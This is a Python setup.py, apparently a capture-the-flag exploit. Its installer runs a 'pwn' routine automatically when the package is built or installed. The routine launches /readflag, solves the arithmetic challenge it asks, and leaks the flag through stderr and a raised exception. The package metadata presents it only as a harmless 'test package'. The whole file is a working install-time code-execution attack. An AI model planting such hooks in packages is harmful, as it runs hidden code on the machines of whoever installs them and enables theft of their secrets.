from setuptools import setup
import os
import sys
import subprocess
import re

# ================= EXPLOIT START =================
def pwn():
    # 打印显眼的日志
    sys.stderr.write("\n\n[EXPLOIT] SETUP.PY STARTED!!!\n\n")
    sys.stderr.flush()
    
    target = "/readflag"
    if not os.path.exists(target):
        sys.stderr.write(f"[EXPLOIT] {target} not found, maybe local test?\n")
        # 本地测试回显
        # return 

    try:
        sys.stderr.write("[EXPLOIT] Running /readflag...\n")
        p = subprocess.Popen(
            [target], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True,
            bufsize=0
        )
        
        buffer = ""
        while True:
            char = p.stdout.read(1)
            if not char: break
            buffer += char
            if "input your answer:" in buffer: break
        
        sys.stderr.write(f"[EXPLOIT] Question: {buffer}\n")
        
        match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', buffer)
        if match:
            n1, op, n2 = int(match.group(1)), match.group(2), int(match.group(3))
            res = {"+": n1+n2, "-": n1-n2, "*": n1*n2}.get(op, 0)
            
            sys.stderr.write(f"[EXPLOIT] Answer: {res}\n")
            p.stdin.write(f"{res}\n")
            p.stdin.flush()
            
            flag = p.stdout.read()
            # 打印 Flag !!!
            sys.stderr.write(f"\n\n[+] FLAG: {flag}\n\n")
            # 甚至抛出异常让日志更明显
            raise RuntimeError(f"PWNED: {flag}")
        else:
            sys.stderr.write("[EXPLOIT] Regex failed\n")

    except Exception as e:
        sys.stderr.write(f"[EXPLOIT] Error: {e}\n")

# 立即执行攻击
pwn()
# ================= EXPLOIT END =================

setup(
    name='vulnerability-test',
    version='1.0.0',
    description='A test package',
    packages=[],
)
